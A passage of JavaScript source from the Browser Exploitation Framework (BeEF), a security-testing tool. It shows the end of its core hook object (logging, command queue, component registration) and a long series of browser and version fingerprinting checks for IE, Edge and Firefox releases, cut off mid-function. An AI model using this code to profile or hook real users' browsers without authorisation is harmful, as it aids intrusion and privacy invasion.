                var datetime = currentdate.getFullYear() + "-" + pad(currentdate.getMonth() + 1) + "-" + pad(currentdate.getDate()) + " " + pad(currentdate.getHours()) + ":" + pad(currentdate.getMinutes()) + ":" + pad(currentdate.getSeconds());
                console.log('[' + datetime + '] ' + msg);
            } else {// TODO: maybe add a callback to BeEF server for debugging purposes
            //window.alert(msg);
            }
        },

        /**
        * Adds a function to execute.
        * @param: {Function} the function to execute.
        */
        execute: function(fn) {
            if (typeof beef.websocket == "undefined") {
                this.commands.push(fn);
            } else {
                fn();
            }
        },

        /**
        * Registers a component in BeEF JS.
        * @params: {String} the component.
        *
        * Components are very important to register so the framework does not
        * send them back over and over again.
        */
        regCmp: function(component) {
            this.components.push(component);
        }

    };

    window.beef = BeefJS;
}

//
// Copyright (c) 2006-2019 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/**
 * @literal object: beef.browser
 *
 * Basic browser functions.
 */
beef.browser = {

    /**
     * Returns the user agent that the browser is claiming to be.
     * @example: beef.browser.getBrowserReportedName()
     */
    getBrowserReportedName: function() {
        return navigator.userAgent;
    },

    /**
     * Returns the underlying layout engine in use by the browser.
     * @example: beef.browser.getBrowserEngine()
     */
    getBrowserEngine: function() {
        try {
            var engine = platform.layout;
            if (!!engine)
                return engine;
        } catch (e) {}
        return 'unknown';
    },

    /**
     * Returns true if Avant Browser.
     * @example: beef.browser.isA()
     */
    isA: function() {
        return window.navigator.userAgent.match(/Avant TriCore/) != null;
    },

    /**
     * Returns true if Iceweasel.
     * @example: beef.browser.isIceweasel()
     */
    isIceweasel: function() {
        return window.navigator.userAgent.match(/Iceweasel\/\d+\.\d/) != null;
    },

    /**
     * Returns true if Midori.
     * @example: beef.browser.isMidori()
     */
    isMidori: function() {
        return window.navigator.userAgent.match(/Midori\/\d+\.\d/) != null;
    },

    /**
     * Returns true if Odyssey
     * @example: beef.browser.isOdyssey()
     */
    isOdyssey: function() {
        return (window.navigator.userAgent.match(/Odyssey Web Browser/) != null && window.navigator.userAgent.match(/OWB\/\d+\.\d/) != null);
    },

    /**
     * Returns true if Brave
     * @example: beef.browser.isBrave()
     */
    isBrave: function() {
        return (window.navigator.userAgent.match(/brave\/\d+\.\d/) != null && window.navigator.userAgent.match(/Brave\/\d+\.\d/) != null);
    },

    /**
     * Returns true if IE6.
     * @example: beef.browser.isIE6()
     */
    isIE6: function() {
        return !window.XMLHttpRequest && !window.globalStorage;
    },

    /**
     * Returns true if IE7.
     * @example: beef.browser.isIE7()
     */
    isIE7: function() {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !window.getComputedStyle && !window.globalStorage && !document.documentMode;
    },

    /**
     * Returns true if IE8.
     * @example: beef.browser.isIE8()
     */
    isIE8: function() {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.XDomainRequest && !window.performance;
    },

    /**
     * Returns true if IE9.
     * @example: beef.browser.isIE9()
     */
    isIE9: function() {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.XDomainRequest && !!window.performance && typeof navigator.msMaxTouchPoints === "undefined";
    },

    /**
     *
     * Returns true if IE10.
     * @example: beef.browser.isIE10()
     */
    isIE10: function() {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !window.XDomainRequest && !!window.performance && typeof navigator.msMaxTouchPoints !== "undefined";
    },

    /**
     *
     * Returns true if IE11.
     * @example: beef.browser.isIE11()
     */
    isIE11: function() {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.performance && typeof navigator.msMaxTouchPoints !== "undefined" && typeof document.selection === "undefined" && typeof document.createStyleSheet === "undefined" && typeof window.createPopup === "undefined" && typeof window.XDomainRequest === "undefined";
    },

    /**
     *
     * Returns true if Edge.
     * @example: beef.browser.isEdge()
     */
    isEdge: function() {
        return !beef.browser.isIE() && !!window.StyleMedia;
    },

    /**
     * Returns true if IE.
     * @example: beef.browser.isIE()
     */
    isIE: function() {
        return this.isIE6() || this.isIE7() || this.isIE8() || this.isIE9() || this.isIE10() || this.isIE11();
    },

    /**
     * Returns true if FF2.
     * @example: beef.browser.isFF2()
     */
    isFF2: function() {
        return !!window.globalStorage && !window.postMessage;
    },

    /**
     * Returns true if FF3.
     * @example: beef.browser.isFF3()
     */
    isFF3: function() {
        return !!window.globalStorage && !!window.postMessage && !JSON.parse;
    },

    /**
     * Returns true if FF3.5.
     * @example: beef.browser.isFF3_5()
     */
    isFF3_5: function() {
        return !!window.globalStorage && !!JSON.parse && !window.FileReader;
    },

    /**
     * Returns true if FF3.6.
     * @example: beef.browser.isFF3_6()
     */
    isFF3_6: function() {
        return !!window.globalStorage && !!window.FileReader && !window.multitouchData && !window.history.replaceState;
    },

    /**
     * Returns true if FF4.
     * @example: beef.browser.isFF4()
     */
    isFF4: function() {
        return !!window.globalStorage && !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/4\./) != null;
    },

    /**
     * Returns true if FF5.
     * @example: beef.browser.isFF5()
     */
    isFF5: function() {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/5\./) != null;
    },

    /**
     * Returns true if FF6.
     * @example: beef.browser.isFF6()
     */
    isFF6: function() {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/6\./) != null;
    },

    /**
     * Returns true if FF7.
     * @example: beef.browser.isFF7()
     */
    isFF7: function() {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/7\./) != null;
    },

    /**
     * Returns true if FF8.
     * @example: beef.browser.isFF8()
     */
    isFF8: function() {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/8\./) != null;
    },

    /**
     * Returns true if FF9.
     * @example: beef.browser.isFF9()
     */
    isFF9: function() {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/9\./) != null;
    },

    /**
     * Returns true if FF10.
     * @example: beef.browser.isFF10()
     */
    isFF10: function() {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/10\./) != null;
    },

    /**
     * Returns true if FF11.
     * @example: beef.browser.isFF11()
     */
    isFF11: function() {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/11\./) != null;
    },

    /**
     * Returns true if FF12
     * @example: beef.browser.isFF12()
     */
    isFF12: function() {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/12\./) != null;
    },

    /**
     * Returns true if FF13
     * @example: beef.browser.isFF13()
     */
    isFF13: function() {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/13\./) != null;
    },

    /**
     * Returns true if FF14
     * @example: beef.browser.isFF14()
     */
    isFF14: function() {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/14\./) != null;
    },

    /**
     * Returns true if FF15
     * @example: beef.browser.isFF15()
     */
    isFF15: function() {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/15\./) != null;
    },

    /**
     * Returns true if FF16
     * @example: beef.browser.isFF16()
     */
    isFF16: function() {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/16\./) != null;
    },

    /**
     * Returns true if FF17
     * @example: beef.browser.isFF17()
     */
    isFF17: function() {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/17\./) != null;
    },

    /**
     * Returns true if FF18
     * @example: beef.browser.isFF18()
     */
    isFF18: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/18\./) != null;
    },

    /**
     * Returns true if FF19
     * @example: beef.browser.isFF19()
     */
    isFF19: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && window.navigator.userAgent.match(/Firefox\/19\./) != null;
    },

    /**
     * Returns true if FF20
     * @example: beef.browser.isFF20()
     */
    isFF20: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && window.navigator.userAgent.match(/Firefox\/20\./) != null;
    },

    /**
     * Returns true if FF21
     * @example: beef.browser.isFF21()
     */
    isFF21: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/21\./) != null;
    },

    /**
     * Returns true if FF22
     * @example: beef.browser.isFF22()
     */
    isFF22: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/22\./) != null;
    },

    /**
     * Returns true if FF23
     * @example: beef.browser.isFF23()
     */
    isFF23: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/23\./) != null;
    },

    /**
     * Returns true if FF24
     * @example: beef.browser.isFF24()
     */
    isFF24: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/24\./) != null;
    },

    /**
     * Returns true if FF25
     * @example: beef.browser.isFF25()
     */
    isFF25: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/25\./) != null;
    },

    /**
     * Returns true if FF26
     * @example: beef.browser.isFF26()
     */
    isFF26: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/26./) != null;
    },

    /**
     * Returns true if FF27
     * @example: beef.browser.isFF27()
     */
    isFF27: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && window.navigator.userAgent.match(/Firefox\/27./) != null;
    },

    /**
     * Returns true if FF28
     * @example: beef.browser.isFF28()
     */
    isFF28: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt !== 'function' && window.navigator.userAgent.match(/Firefox\/28./) != null;
    },

    /**
     * Returns true if FF29
     * @example: beef.browser.isFF29()
     */
    isFF29: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && window.navigator.userAgent.match(/Firefox\/29./) != null;
    },

    /**
     * Returns true if FF30
     * @example: beef.browser.isFF30()
     */
    isFF30: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && window.navigator.userAgent.match(/Firefox\/30./) != null;
    },

    /**
     * Returns true if FF31
     * @example: beef.browser.isFF31()
     */
    isFF31: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && window.navigator.userAgent.match(/Firefox\/31./) != null;
    },

    /**
     * Returns true if FF32
     * @example: beef.browser.isFF32()
     */
    isFF32: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/32./) != null;
    },

    /**
     * Returns true if FF33
     * @example: beef.browser.isFF33()
     */
    isFF33: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/33./) != null;
    },

    /**
     * Returns true if FF34
     * @example: beef.browser.isFF34()
     */
    isFF34: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/34./) != null;
    },

    /**
     * Returns true if FF35
     * @example: beef.browser.isFF35()
     */
    isFF35: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/35./) != null;
    },

    /**
     * Returns true if FF36
     * @example: beef.browser.isFF36()
     */
    isFF36: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/36./) != null;
    },

    /**
     * Returns true if FF37
     * @example: beef.browser.isFF37()
     */
    isFF37: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/37./) != null;
    },

    /**
     * Returns true if FF38
     * @example: beef.browser.isFF38()
     */
    isFF38: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/38./) != null;
    },

    /**
     * Returns true if FF39
     * @example: beef.browser.isFF39()
     */
    isFF39: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/39./) != null;
    },

    /**
     * Returns true if FF40
     * @example: beef.browser.isFF40()
     */
    isFF40: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/40./) != null;
    },

    /**
     * Returns true if FF41
     * @example: beef.browser.isFF41()
     */
    isFF41: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/41./) != null;
    },

    /**
     * Returns true if FF42
     * @example: beef.browser.isFF42()
     */
    isFF42: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/42./) != null;
    },

    /**
     * Returns true if FF43
     * @example: beef.browser.isFF43()
     */
    isFF43: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/43./) != null;
    },

    /**
     * Returns true if FF44
     * @example: beef.browser.isFF44()
     */
    isFF44: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/44./) != null;
    },

    /**
     * Returns true if FF45
     * @example: beef.browser.isFF45()
     */
    isFF45: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/45./) != null;
    },

    /**
     * Returns true if FF46
     * @example: beef.browser.isFF46()
     */
    isFF46: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/46./) != null;
    },

    /**
     * Returns true if FF47
     * @example: beef.browser.isFF47()
     */
    isFF47: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/47./) != null;
    },

    /**
     * Returns true if FF48
     * @example: beef.browser.isFF48()
     */
    isFF48: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/48./) != null;
    },

    /**
     * Returns true if FF49
     * @example: beef.browser.isFF49()
     */
    isFF49: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/49./) != null;
    },

    /**
     * Returns true if FF50
     * @example: beef.browser.isFF50()
     */
    isFF50: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/50./) != null;
    },

    /**
     * Returns true if FF51
     * @example: beef.browser.isFF51()
     */
    isFF51: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/51./) != null;
    },

    /**
     * Returns true if FF52
     * @example: beef.browser.isFF52()
     */
    isFF52: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/52./) != null;
    },

    /**
     * Returns true if FF53
     * @example: beef.browser.isFF53()
     */
    isFF53: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/53./) != null;
    },

    /**
     * Returns true if FF54
     * @example: beef.browser.isFF54()
     */
    isFF54: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/54./) != null;
    },

    /**
     * Returns true if FF55
     * @example: beef.browser.isFF55()
     */
    isFF55: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/55./) != null;
    },

    /**
     * Returns true if FF56
     * @example: beef.browser.isFF56()
     */
    isFF56: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/56./) != null;
    },

    /**
     * Returns true if FF57
     * @example: beef.browser.isFF57()
     */
    isFF57: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/57./) != null;
    },

    /**
     * Returns true if FF58
     * @example: beef.browser.isFF58()
     */
    isFF58: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/58./) != null;
    },

    /**
     * Returns true if FF59
     * @example: beef.browser.isFF59()
     */
    isFF59: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/59./) != null;
    },

    /**
     * Returns true if FF60
     * @example: beef.browser.isFF60()
     */
    isFF60: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/60./) != null;
    },

    /**
     * Returns true if FF61
     * @example: beef.browser.isFF61()
     */
    isFF61: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/61./) != null;
    },

    /**
     * Returns true if FF62
     * @example: beef.browser.isFF62()
     */
    isFF62: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/62./) != null;
    },

    /**
     * Returns true if FF63
     * @example: beef.browser.isFF63()
     */
    isFF63: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/63./) != null;
    },

    /**
     * Returns true if FF64
     * @example: beef.browser.isFF64()
     */
    isFF64: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/64./) != null;
    },

    /**
     * Returns true if FF65
     * @example: beef.browser.isFF65()
     */
    isFF65: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/65./) != null;
    },

    /**
     * Returns true if FF66
     * @example: beef.browser.isFF66()
     */
    isFF66: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/66./) != null;
    },

    /**
     * Returns true if FF67
     * @example: beef.browser.isFF67()
     */
    isFF67: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/67./) != null;
    },

    /**
     * Returns true if FF68
     * @example: beef.browser.isFF68()
     */
    isFF68: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/68./) != null;
    },

    /**
     * Returns true if FF69
     * @example: beef.browser.isFF69()
     */
    isFF69: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/69./) != null;
    },

    /**
     * Returns true if FF70
     * @example: beef.browser.isFF70()
     */
    isFF70: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/70./) != null;
    },

    /**
     * Returns true if FF71
     * @example: beef.browser.isFF71()
     */
    isFF71: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/71./) != null;
    },

    /**
     * Returns true if FF72
     * @example: beef.browser.isFF72()
     */
    isFF72: function() {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/72./) != null;
    },

    /**
     * Returns true if FF73
     * @example: beef.browser.isFF73()
     */
    isFF73: function() {
